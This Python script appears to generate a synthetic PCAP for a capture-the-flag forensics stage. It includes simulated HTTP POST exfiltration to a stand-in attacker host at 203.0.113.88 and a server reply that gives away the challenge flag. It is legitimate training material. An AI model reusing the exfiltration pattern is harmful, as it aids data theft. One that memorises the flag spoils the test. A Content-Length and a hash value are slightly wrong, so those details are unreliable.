"""
CyberBank: Operation BlackVault
Stage 05 — PCAP Generator Script

Generates a synthetic, self-contained PCAP file simulating network traffic
from the isolated workstation WS-INVEST-SEC04 (10.10.20.155):
    - Routine DNS query/response (gateway 10.10.20.1)
    - Routine NTP synchronization packet
    - Internal HTTP health-check GET to 10.10.20.50
    - Suspicious TCP connection & HTTP POST exfiltration to external staging
      server 203.0.113.88:8443
    - Server HTTP 200 OK response containing the forensic authorization flag:
      CBANK{FORENSICS_dchen_9f88c2_exf1l_8443}

All traffic uses RFC 5737 test IP addresses and fictional hostnames.
Dependency-free: pure Python standard library (struct + socket).
"""

import os
import struct
import socket
import datetime


def calculate_checksum(data: bytes) -> int:
    """Compute the 16-bit Internet Checksum (RFC 1071)."""
    if len(data) % 2 == 1:
        data += b"\x00"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while (total >> 16) > 0:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def build_ipv4_header(
    src_ip: str,
    dst_ip: str,
    protocol: int,
    payload_len: int,
    ident: int = 1001,
    ttl: int = 64,
) -> bytes:
    """Build a 20-byte IPv4 header with valid checksum."""
    version_ihl = (4 << 4) | 5
    tos = 0
    total_len = 20 + payload_len
    flags_frag = 0x4000  # Don't fragment
    chksum = 0
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)

    hdr_pre = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        tos,
        total_len,
        ident,
        flags_frag,
        ttl,
        protocol,
        chksum,
        src_bytes,
        dst_bytes,
    )
    chksum = calculate_checksum(hdr_pre)
    return struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        tos,
        total_len,
        ident,
        flags_frag,
        ttl,
        protocol,
        chksum,
        src_bytes,
        dst_bytes,
    )


def build_tcp_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    seq: int,
    ack: int,
    flags: int,
    payload: bytes = b"",
    window: int = 64240,
) -> bytes:
    """Build a TCP packet with accurate pseudo-header checksum."""
    data_offset_reserved = (5 << 4)  # 5 32-bit words = 20 bytes, no options
    chksum = 0
    urgent_ptr = 0

    tcp_pre = struct.pack(
        "!HHIIBBHHH",
        src_port,
        dst_port,
        seq,
        ack,
        data_offset_reserved,
        flags,
        window,
        chksum,
        urgent_ptr,
    )

    # TCP Pseudo-header for checksum
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)
    pseudo_hdr = struct.pack(
        "!4s4sBBH",
        src_bytes,
        dst_bytes,
        0,
        socket.IPPROTO_TCP,
        len(tcp_pre) + len(payload),
    )
    chksum = calculate_checksum(pseudo_hdr + tcp_pre + payload)

    tcp_hdr = struct.pack(
        "!HHIIBBHHH",
        src_port,
        dst_port,
        seq,
        ack,
        data_offset_reserved,
        flags,
        window,
        chksum,
        urgent_ptr,
    )
    return tcp_hdr + payload


def build_udp_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    payload: bytes = b"",
) -> bytes:
    """Build a UDP header and compute pseudo-header checksum."""
    length = 8 + len(payload)
    chksum = 0
    udp_pre = struct.pack("!HHHH", src_port, dst_port, length, chksum)
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)
    pseudo_hdr = struct.pack(
        "!4s4sBBH",
        src_bytes,
        dst_bytes,
        0,
        socket.IPPROTO_UDP,
        length,
    )
    chksum = calculate_checksum(pseudo_hdr + udp_pre + payload)
    if chksum == 0:
        chksum = 0xFFFF
    udp_hdr = struct.pack("!HHHH", src_port, dst_port, length, chksum)
    return udp_hdr + payload


def build_ethernet_frame(
    src_mac: bytes,
    dst_mac: bytes,
    ethertype: int,
    payload: bytes,
) -> bytes:
    """Build a standard 14-byte Ethernet II frame."""
    return dst_mac + src_mac + struct.pack("!H", ethertype) + payload


def create_pcap(output_path: str):
    """
    Generate synthetic forensic PCAP file.
    Output: network_capture.pcap
    """
    # MAC addresses
    mac_workstation = b"\x00\x16\x3e\x7a\x55\xbb"
    mac_gateway = b"\x52\x54\x00\x12\x34\x56"

    # IPs
    ip_workstation = "10.10.20.155"
    ip_gateway = "10.10.20.1"
    ip_internal_srv = "10.10.20.50"
    ip_attacker_drop = "203.0.113.88"  # RFC 5737 TEST-NET-3

    # Base timestamp: 2026-08-16 02:37:45 UTC
    base_epoch = int(datetime.datetime(2026, 8, 16, 2, 37, 45, tzinfo=datetime.timezone.utc).timestamp())

    packets = []  # list of tuples: (epoch_sec, epoch_usec, raw_frame)

    # 1. DNS Query: workstation -> gateway (query internal-core.cyberbank.local)
    dns_query_payload = (
        b"\x1a\x2b"  # Transaction ID
        b"\x01\x00"  # Flags: Standard query
        b"\x00\x01\x00\x00\x00\x00\x00\x00"  # 1 Question
        b"\x0dinternal-core\tcyberbank\x05local\x00"  # Name
        b"\x00\x01\x00\x01"  # Type A, Class IN
    )
    udp_dns_q = build_udp_packet(ip_workstation, ip_gateway, 54120, 53, dns_query_payload)
    ip_dns_q = build_ipv4_header(ip_workstation, ip_gateway, socket.IPPROTO_UDP, len(udp_dns_q), ident=101)
    frame_dns_q = build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_dns_q + udp_dns_q)
    packets.append((base_epoch, 105200, frame_dns_q))

    # 2. DNS Response: gateway -> workstation (10.10.20.50)
    dns_resp_payload = (
        b"\x1a\x2b"  # Transaction ID
        b"\x81\x80"  # Flags: Standard query response, No error
        b"\x00\x01\x00\x01\x00\x00\x00\x00"  # 1 Question, 1 Answer
        b"\x0dinternal-core\tcyberbank\x05local\x00"  # Name
        b"\x00\x01\x00\x01"  # Type A, Class IN
        b"\xc0\x0c"  # Name pointer
        b"\x00\x01\x00\x01"  # Type A, Class IN
        b"\x00\x00\x01\x2c"  # TTL: 300
        b"\x00\x04"  # Data length 4
        b"\x0a\x0a\x14\x32"  # IP: 10.10.20.50
    )
    udp_dns_r = build_udp_packet(ip_gateway, ip_workstation, 53, 54120, dns_resp_payload)
    ip_dns_r = build_ipv4_header(ip_gateway, ip_workstation, socket.IPPROTO_UDP, len(udp_dns_r), ident=102)
    frame_dns_r = build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_dns_r + udp_dns_r)
    packets.append((base_epoch, 108450, frame_dns_r))

    # 3. Routine internal HTTP health check to 10.10.20.50:80
    # 3a. SYN
    tcp_syn_h = build_tcp_packet(ip_workstation, ip_internal_srv, 49210, 80, seq=10000, ack=0, flags=0x02)
    ip_syn_h = build_ipv4_header(ip_workstation, ip_internal_srv, socket.IPPROTO_TCP, len(tcp_syn_h), ident=201)
    packets.append((base_epoch + 1, 200000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_syn_h + tcp_syn_h)))

    # 3b. SYN-ACK
    tcp_sa_h = build_tcp_packet(ip_internal_srv, ip_workstation, 80, 49210, seq=20000, ack=10001, flags=0x12)
    ip_sa_h = build_ipv4_header(ip_internal_srv, ip_workstation, socket.IPPROTO_TCP, len(tcp_sa_h), ident=202)
    packets.append((base_epoch + 1, 202000, build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_sa_h + tcp_sa_h)))

    # 3c. ACK
    tcp_ack_h = build_tcp_packet(ip_workstation, ip_internal_srv, 49210, 80, seq=10001, ack=20001, flags=0x10)
    ip_ack_h = build_ipv4_header(ip_workstation, ip_internal_srv, socket.IPPROTO_TCP, len(tcp_ack_h), ident=203)
    packets.append((base_epoch + 1, 203000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_ack_h + tcp_ack_h)))

    # 3d. HTTP GET /health
    http_health_req = b"GET /health HTTP/1.1\r\nHost: internal-core.cyberbank.local\r\nUser-Agent: Internal-Monitor/1.0\r\nAccept: */*\r\n\r\n"
    tcp_req_h = build_tcp_packet(ip_workstation, ip_internal_srv, 49210, 80, seq=10001, ack=20001, flags=0x18, payload=http_health_req)
    ip_req_h = build_ipv4_header(ip_workstation, ip_internal_srv, socket.IPPROTO_TCP, len(tcp_req_h), ident=204)
    packets.append((base_epoch + 1, 205000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_req_h + tcp_req_h)))

    # 3e. HTTP 200 OK
    http_health_resp = b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 26\r\n\r\n{\"status\":\"healthy\",\"ok\":1}"
    tcp_resp_h = build_tcp_packet(ip_internal_srv, ip_workstation, 80, 49210, seq=20001, ack=10001 + len(http_health_req), flags=0x18, payload=http_health_resp)
    ip_resp_h = build_ipv4_header(ip_internal_srv, ip_workstation, socket.IPPROTO_TCP, len(tcp_resp_h), ident=205)
    packets.append((base_epoch + 1, 208000, build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_resp_h + tcp_resp_h)))

    # 3f. FIN-ACK from client
    tcp_fin_h = build_tcp_packet(ip_workstation, ip_internal_srv, 49210, 80, seq=10001 + len(http_health_req), ack=20001 + len(http_health_resp), flags=0x11)
    ip_fin_h = build_ipv4_header(ip_workstation, ip_internal_srv, socket.IPPROTO_TCP, len(tcp_fin_h), ident=206)
    packets.append((base_epoch + 1, 210000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_fin_h + tcp_fin_h)))

    # 3g. ACK from server
    tcp_finack_h = build_tcp_packet(ip_internal_srv, ip_workstation, 80, 49210, seq=20001 + len(http_health_resp), ack=10002 + len(http_health_req), flags=0x10)
    ip_finack_h = build_ipv4_header(ip_internal_srv, ip_workstation, socket.IPPROTO_TCP, len(tcp_finack_h), ident=207)
    packets.append((base_epoch + 1, 211000, build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_finack_h + tcp_finack_h)))

    # =========================================================================
    # 4. SUSPICIOUS EXFILTRATION TRAFFIC
    # Workstation 10.10.20.155 -> Attacker Exfil Drop 203.0.113.88:8443
    # Timestamp: 2026-08-16 02:38:12 UTC (base_epoch + 27 seconds)
    # =========================================================================
    exfil_epoch = base_epoch + 27
    client_port = 52844
    server_port = 8443
    seq_c = 500000
    seq_s = 900000

    # 4a. TCP SYN
    tcp_syn_ex = build_tcp_packet(ip_workstation, ip_attacker_drop, client_port, server_port, seq=seq_c, ack=0, flags=0x02)
    ip_syn_ex = build_ipv4_header(ip_workstation, ip_attacker_drop, socket.IPPROTO_TCP, len(tcp_syn_ex), ident=401)
    packets.append((exfil_epoch, 112000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_syn_ex + tcp_syn_ex)))

    # 4b. TCP SYN-ACK
    tcp_sa_ex = build_tcp_packet(ip_attacker_drop, ip_workstation, server_port, client_port, seq=seq_s, ack=seq_c + 1, flags=0x12)
    ip_sa_ex = build_ipv4_header(ip_attacker_drop, ip_workstation, socket.IPPROTO_TCP, len(tcp_sa_ex), ident=402)
    packets.append((exfil_epoch, 145000, build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_sa_ex + tcp_sa_ex)))
    seq_c += 1
    seq_s += 1

    # 4c. TCP ACK
    tcp_ack_ex = build_tcp_packet(ip_workstation, ip_attacker_drop, client_port, server_port, seq=seq_c, ack=seq_s, flags=0x10)
    ip_ack_ex = build_ipv4_header(ip_workstation, ip_attacker_drop, socket.IPPROTO_TCP, len(tcp_ack_ex), ident=403)
    packets.append((exfil_epoch, 146000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_ack_ex + tcp_ack_ex)))

    # 4d. HTTP POST /drop/exfil_relay.php
    post_payload_json = (
        b'{"action":"stage_exfil",'
        b'"source_host":"WS-INVEST-SEC04",'
        b'"compromised_account":"d.chen",'
        b'"session_id":"sess_9f88c21a44e7",'
        b'"archive_name":"blackvault_stage05_custody.tar.gz",'
        b'"archive_sha256":"7e93a8b2c41094f6e1189c4501a33b82"}'
    )
    http_post_req = (
        b"POST /drop/exfil_relay.php HTTP/1.1\r\n"
        b"Host: drop.staging-exfil-relay.local:8443\r\n"
        b"User-Agent: CyberBank-Relay-Client/1.4\r\n"
        b"Accept: */*\r\n"
        b"X-Session-ID: sess_9f88c21a44e7\r\n"
        b"X-Operator: d.chen\r\n"
        b"X-Incident-Ticket: CB-IR-2026-0882\r\n"
        b"Content-Type: application/json\r\n"
        + f"Content-Length: {len(post_payload_json)}\r\n".encode("ascii")
        + b"Connection: close\r\n\r\n"
        + post_payload_json
    )
    tcp_post_ex = build_tcp_packet(ip_workstation, ip_attacker_drop, client_port, server_port, seq=seq_c, ack=seq_s, flags=0x18, payload=http_post_req)
    ip_post_ex = build_ipv4_header(ip_workstation, ip_attacker_drop, socket.IPPROTO_TCP, len(tcp_post_ex), ident=404)
    packets.append((exfil_epoch + 1, 230000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_post_ex + tcp_post_ex)))
    seq_c += len(http_post_req)

    # 4e. Server ACK for POST
    tcp_ack_post = build_tcp_packet(ip_attacker_drop, ip_workstation, server_port, client_port, seq=seq_s, ack=seq_c, flags=0x10)
    ip_ack_post = build_ipv4_header(ip_attacker_drop, ip_workstation, socket.IPPROTO_TCP, len(tcp_ack_post), ident=405)
    packets.append((exfil_epoch + 1, 260000, build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_ack_post + tcp_ack_post)))

    # 4f. HTTP 200 OK Response from server containing the Forensic Flag!
    resp_payload_json = (
        b'{\n'
        b'  "status": "SUCCESS",\n'
        b'  "incident_case": "CB-IR-2026-0882",\n'
        b'  "compromised_operator": "d.chen",\n'
        b'  "session_token": "sess_9f88c21a44e7",\n'
        b'  "exfiltrated_file": "blackvault_stage05_custody.tar.gz",\n'
        b'  "forensic_authorization_flag": "CBANK{FORENSICS_dchen_9f88c2_exf1l_8443}"\n'
        b'}'
    )
    http_resp_data = (
        b"HTTP/1.1 200 OK\r\n"
        b"Date: Sun, 16 Aug 2026 02:38:15 GMT\r\n"
        b"Server: Apache/2.4.58 (Unix)\r\n"
        b"Content-Type: application/json\r\n"
        + f"Content-Length: {len(resp_payload_json)}\r\n".encode("ascii")
        + b"Connection: close\r\n\r\n"
        + resp_payload_json
    )
    tcp_resp_ex = build_tcp_packet(ip_attacker_drop, ip_workstation, server_port, client_port, seq=seq_s, ack=seq_c, flags=0x18, payload=http_resp_data)
    ip_resp_ex = build_ipv4_header(ip_attacker_drop, ip_workstation, socket.IPPROTO_TCP, len(tcp_resp_ex), ident=406)
    packets.append((exfil_epoch + 3, 410000, build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_resp_ex + tcp_resp_ex)))
    seq_s += len(http_resp_data)

    # 4g. Client ACK for response
    tcp_ack_resp = build_tcp_packet(ip_workstation, ip_attacker_drop, client_port, server_port, seq=seq_c, ack=seq_s, flags=0x10)
    ip_ack_resp = build_ipv4_header(ip_workstation, ip_attacker_drop, socket.IPPROTO_TCP, len(tcp_ack_resp), ident=407)
    packets.append((exfil_epoch + 3, 440000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_ack_resp + tcp_ack_resp)))

    # 4h. Server FIN-ACK
    tcp_fin_s = build_tcp_packet(ip_attacker_drop, ip_workstation, server_port, client_port, seq=seq_s, ack=seq_c, flags=0x11)
    ip_fin_s = build_ipv4_header(ip_attacker_drop, ip_workstation, socket.IPPROTO_TCP, len(tcp_fin_s), ident=408)
    packets.append((exfil_epoch + 3, 445000, build_ethernet_frame(mac_gateway, mac_workstation, 0x0800, ip_fin_s + tcp_fin_s)))
    seq_s += 1

    # 4i. Client ACK
    tcp_ack_fin = build_tcp_packet(ip_workstation, ip_attacker_drop, client_port, server_port, seq=seq_c, ack=seq_s, flags=0x10)
    ip_ack_fin = build_ipv4_header(ip_workstation, ip_attacker_drop, socket.IPPROTO_TCP, len(tcp_ack_fin), ident=409)
    packets.append((exfil_epoch + 3, 448000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_ack_fin + tcp_ack_fin)))

    # 4j. Client FIN-ACK
    tcp_fin_c = build_tcp_packet(ip_workstation, ip_attacker_drop, client_port, server_port, seq=seq_c, ack=seq_s, flags=0x11)
    ip_fin_c = build_ipv4_header(ip_workstation, ip_attacker_drop, socket.IPPROTO_TCP, len(tcp_fin_c), ident=410)
    packets.append((exfil_epoch + 3, 450000, build_ethernet_frame(mac_workstation, mac_gateway, 0x0800, ip_fin_c + tcp_fin_c)))

    # Write PCAP file
    # Global header (24 bytes)
    # Magic (0xa1b2c3d4), Major (2), Minor (4), Thiszone (0), Sigfigs (0), Snaplen (65535), Network (1 = LINKTYPE_ETHERNET)
    global_hdr = struct.pack("!IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)

    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
    with open(output_path, "wb") as f:
        f.write(global_hdr)
        for ts_sec, ts_usec, frame in packets:
            incl_len = len(frame)
            orig_len = len(frame)
            pkt_hdr = struct.pack("!IIII", ts_sec, ts_usec, incl_len, orig_len)
            f.write(pkt_hdr)
            f.write(frame)

    print(f"[+] PCAP successfully generated: {output_path} ({len(packets)} packets)")


if __name__ == "__main__":
    target = os.path.join(os.path.dirname(__file__), "..", "challenges", "stage5_forensics", "evidence", "network_capture.pcap")
    create_pcap(target)
